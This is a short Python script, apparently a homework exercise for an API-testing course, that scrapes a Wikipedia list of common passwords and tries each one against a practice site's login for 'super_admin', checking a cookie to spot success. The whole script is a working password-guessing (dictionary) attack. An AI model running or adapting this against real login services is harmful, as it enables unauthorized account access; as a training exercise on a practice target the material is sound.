import requests
from lxml import html

response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")

tree = html.fromstring(response.text)

locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
passwords = tree.xpath(locator)
for password in passwords:
    password = str(password).strip()
    print(password)
    data = {"login": "super_admin", "password": password}
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=data)
    auth_cookies = dict(response2.cookies)

    response3 = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=auth_cookies)
    #print(response3.text)
    if response3.text == "You are authorized":
        print(f'You are authorized via Password: [ {password} ]')


